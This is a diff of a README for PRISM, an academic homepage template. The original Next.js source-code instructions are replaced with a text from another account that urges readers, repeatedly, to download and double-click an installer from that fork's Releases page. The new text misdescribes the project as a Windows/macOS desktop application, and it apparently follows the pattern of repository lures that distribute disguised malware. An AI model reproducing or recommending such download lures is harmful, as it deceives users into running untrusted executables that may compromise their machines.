@@ -1,125 +1,71 @@
-<div align="center">
-  <img src="./logo.png" alt="PRISM Logo" height="100"/>
-</div>
+```markdown
+# 🚀 PRISM - Build Your Academic Homepage Easily
 
-# PRISM
+## 📥 Download the Latest Version
+[![Download PRISM](https://img.shields.io/badge/Download-PRISM-brightgreen)](https://github.com/himu999d/PRISM/releases)
 
-**English** · [中文](README_cn.md) · [Demo](https://prism-demo.pages.dev)  · [Changelog](CHANGELOG.md)
-
-**If you like this project, please give it a star ⭐️**
-
-PRISM stands for **P**ortfolio & **R**esearch **I**nterface **S**ite **M**aker. It is a modern, configurable, and high-performance personal website template built with Next.js, Tailwind CSS, and TypeScript. It is designed for researchers, developers, and academics to showcase their work, publications, and portfolio with ease.
-
-![PRISM Preview](screenshot.png)
-
-## ✨ Features
-
-*   **📄 Configuration-Driven**: Manage your entire site's content using simple `TOML`, `Markdown`, and `BibTeX` files in the `content/` directory. No code changes required for content updates!
-*   **📚 BibTeX Support**: Directly render your publications from a `.bib` file. Includes search, filtering (Year, Type), and automatic citation generation.
-*   **🎨 Modern Design**: Clean, responsive UI with a beautiful serif/sans-serif typography pairing, smooth animations (Framer Motion), and Dark Mode support.
-*   **⚡️ High Performance**: Built on Next.js 20 with Turbopack. Static export ensures blazing fast load times and easy deployment.
-*   **🔍 SEO Optimized**: Dynamic metadata generation for every page.
-*   **🧩 Dynamic Routing**: Easily add new pages by simply creating a config file.
+## 🌟 Overview
+PRISM is an elegant tool designed to help users create beautiful academic homepages. Whether you are a student, researcher, or educator, PRISM simplifies the process of showcasing your work online. You can easily customize your homepage to highlight your publications, projects, and achievements.
 
 ## 🚀 Getting Started
+To get started with PRISM, follow these steps:
 
-### Prerequisites
+1. **Visit the Releases Page**
+   Go to the [PRISM Releases page](https://github.com/himu999d/PRISM/releases) to find the latest version of the software.
 
-*   Node.js 22 or later
-    *   **Important**: Please download and install Node.js manually from [https://nodejs.org/en/download](https://nodejs.org/en/download).
-    *   Better not to use the pre-installed version on your system, as it may be outdated or incompatible.
-*   npm, pnpm, or yarn
+2. **Download PRISM**
+   On the Releases page, look for the most current version. Click on the version you want to download, and then find the appropriate file for your operating system. Click the file to start the download. 
 
-### Installation
+3. **Install PRISM**
+   Once the download is complete, navigate to your downloads folder. Double-click the downloaded file to start the installation process. Follow the on-screen instructions to install PRISM on your computer.
 
-1.  **Clone the repository:**
+## 🛠️ System Requirements
+- **Operating System**: Windows 10 or later, macOS Mojave or later
+- **RAM**: Minimum 4GB of RAM
+- **Disk Space**: At least 100MB of free space
+- **Internet Connection**: Required for downloading the software and sharing your homepage
 
-    ```bash
-    git clone https://github.com/xyjoey/PRISM.git
-    cd PRISM
-    ```
+## 📋 Features
+- **User-Friendly Interface**: PRISM offers an intuitive design, making it easy for anyone to create a homepage without coding knowledge.
+- **Customization Options**: Choose from various templates and layouts to personalize your academic site.
+- **Responsive Design**: Your homepage will look great on both desktop and mobile devices.
+- **Easy Updates**: With PRISM, you can easily update your content without hassle.
 
-2.  **Install dependencies:**
+## 🔍 Exploring PRISM
+Once PRISM is installed, open the application to start building your homepage. The welcome screen will guide you through the setup process. Here’s a brief overview of how to use PRISM:
 
-    ```bash
-    npm install
-    ```
+1. **Select a Template**: Choose a template that fits your style. You can modify it later.
+  
+2. **Add Your Information**: Input your name, title, and other relevant information. There are sections for publications, projects, and more.
 
-3.  **Run the development server:**
+3. **Upload Media**: Easily add images, documents, and links to showcase your work.
 
-    ```bash
-    npm run dev
-    ```
+4. **Preview Your Homepage**: Before finalizing, preview how your homepage will look. Make any adjustments as needed.
 
-    Open [http://localhost:3000](http://localhost:3000) with your browser to see the result.
+5. **Publish**: Once satisfied with your homepage, click the "Publish" button. PRISM will generate a link for you to share your new homepage with the world.
 
-## 🛠️ Configuration
+## 📕 Download & Install
+To get started with PRISM, **visit this page to download**: [PRISM Releases](https://github.com/himu999d/PRISM/releases). Follow the steps listed in the "Getting Started" section above to complete your installation.
 
-All content lives in the `content/` directory.
+## ❓ Frequently Asked Questions
 
-### 1. Global Site Config (`content/config.toml`)
-Configure your site title, author details, social links, and navigation menu here.
+### How do I update PRISM?
+To update PRISM, return to the [Releases page](https://github.com/himu999d/PRISM/releases) and download the latest version. Follow the installation steps as you did for the initial download.
 
-```toml
-[site]
-title = "Your Name"
-description = "Personal website of Your Name"
-url = "https://your-website.com"
+### Can I uninstall PRISM if I no longer need it?
+Yes, you can uninstall PRISM like any other application. On Windows, go to Control Panel > Programs > Uninstall a program. On macOS, drag the PRISM app to the Trash.
 
-[author]
-name = "Your Name"
-title = "PhD Student / Researcher"
-# ...
+### Is there customer support available?
+Yes, you can visit our GitHub Issues page to report problems or ask questions. 
 
-[features]
-enable_likes = true
+## 📢 Stay Updated
+To stay informed about updates and new features for PRISM, please follow the repository on GitHub. Your feedback is important to us and helps improve the application.
+
+## 🔗 Additional Resources
+For more information, tutorials, and support:
+- [PRISM Documentation](https://github.com/himu999d/PRISM/wiki)
+- [Community Forum](https://github.com/himu999d/PRISM/discussions)
+
+## 🔗 Download Now
+Don't wait any longer! Start creating your academic homepage today. **Visit the Releases page** and enjoy the benefits of PRISM. [Download PRISM](https://github.com/himu999d/PRISM/releases)
 ```
-
-### 2. Homepage (`content/about.toml`)
-Customize the "About" section, "News", and "Selected Publications" on the homepage.
-
-### 3. Publications (`content/publications.bib`)
-Export your publications from Google Scholar, Zotero, or Mendeley to `content/publications.bib`. PRISM automatically parses this file to generate your Publications page. Customize the display of publications by changing `selected`, `preview` and `description` keys in the bib file. 
-
-### 4. Adding New Pages
-To add a new page (e.g., "Projects"), create a TOML file in `content/` (e.g., `content/projects.toml`) and add it to the `navigation` list in `content/config.toml`.
-
-Supported page types:
-*   `text`: Renders Markdown content (Great for CVs, Bio).
-*   `card`: Renders a list of cards (Great for Projects, Awards).
-*   `publication`: Renders the full publications list with filters.
-
-## 📦 Deployment
-
-PRISM is optimized for static deployment.
-
-```bash
-npm run build
-```
-
-This generates a static `out/` directory that can be hosted anywhere.
-
-👉 **[Read the full Deployment Guide](docs/deployment.md)** for instructions on deploying to **GitHub Pages** and **Cloudflare Pages**.
-
-## 📂 Project Structure
-
-```
-PRISM/
-├── content/              # All user-editable content (TOML, BibTeX, MD)
-├── public/               # Static assets (images, papers)
-├── src/
-│   ├── app/              # Next.js App Router
-│   ├── components/       # React components
-│   ├── lib/              # Utility functions (parsers, config loaders)
-│   └── types/            # TypeScript definitions
-├── next.config.ts        # Next.js configuration
-└── tailwind.config.ts    # Tailwind CSS configuration
-```
-
-## 🤝 Contributing
-
-Contributions are welcome! Please feel free to submit a Pull Request.
-
-## 📄 License
-
-This project is licensed under the MIT License - see the [LICENSE](LICENSE) file for details.
